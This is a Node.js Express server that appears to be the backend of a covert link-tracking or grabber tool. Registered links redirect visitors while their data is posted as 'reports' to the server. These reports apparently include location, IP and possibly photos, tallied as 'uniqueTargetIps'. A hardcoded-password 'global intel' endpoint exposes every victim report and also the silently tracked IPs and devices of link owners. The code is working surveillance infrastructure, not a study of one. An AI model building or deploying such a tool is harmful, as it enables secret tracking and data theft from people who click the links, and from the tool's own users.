
import express from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// In-memory databases
let reports = [];
let registeredLinks = []; 
let owners = {}; // Map of ownerId -> OwnerInfo

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'dist')));

const ADMIN_USER = "helloworld";
const ADMIN_PASS = "aadi";

// Track Owner metadata (Silent, no photos)
app.post('/api/track-owner', (req, res) => {
  const { ownerId, device } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  
  owners[ownerId] = {
    ownerId,
    ip: Array.isArray(ip) ? ip[0] : ip,
    device,
    lastActive: new Date().toISOString()
  };
  res.status(200).json({ status: 'tracked' });
});

app.post('/api/register-link', (req, res) => {
  const { id, ownerId, redirectUrl, name } = req.body;
  registeredLinks.push({ id, ownerId, redirectUrl, name, createdAt: new Date().toISOString() });
  res.status(200).json({ status: 'success' });
});

app.get('/api/link-info/:id', (req, res) => {
  const link = registeredLinks.find(l => l.id === req.params.id);
  if (!link) return res.status(404).json({ error: 'Link not found' });
  res.json({ redirectUrl: link.redirectUrl });
});

app.post('/api/reports/:linkId', (req, res) => {
  const { linkId } = req.params;
  const linkRecord = registeredLinks.find(l => l.id === linkId);
  const ownerId = linkRecord ? linkRecord.ownerId : 'ANONYMOUS';

  const newReport = { 
    ...req.body, 
    linkId,
    ownerId,
    receivedAt: new Date().toISOString() 
  };
  reports.unshift(newReport); 
  res.status(200).json({ status: 'success' });
});

app.get('/api/all-reports', (req, res) => {
  const { ownerId } = req.query;
  res.json(reports.filter(r => r.ownerId === ownerId));
});

// ADMIN: GLOBAL INTEL
app.post('/api/admin/global-intel', (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    res.json({
      reports,
      links: registeredLinks,
      owners,
      stats: {
        totalReports: reports.length,
        totalLinks: registeredLinks.length,
        totalOwners: Object.keys(owners).length,
        uniqueTargetIps: new Set(reports.map(r => r.location?.ip)).size
      }
    });
  } else {
    res.status(401).json({ error: 'Denied' });
  }
});

// ADMIN: DELETION
app.post('/api/admin/delete-report', (req, res) => {
  const { username, password, reportId } = req.body;
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    reports = reports.filter(r => r.id !== reportId);
    res.json({ status: 'deleted' });
  } else res.status(401).send('Denied');
});

app.post('/api/admin/delete-link', (req, res) => {
  const { username, password, linkId } = req.body;
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    registeredLinks = registeredLinks.filter(l => l.id !== linkId);
    // Also remove associated reports
    reports = reports.filter(r => r.linkId !== linkId);
    res.json({ status: 'deleted' });
  } else res.status(401).send('Denied');
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

app.listen(PORT, () => console.log(`SYSTEM ONLINE`));
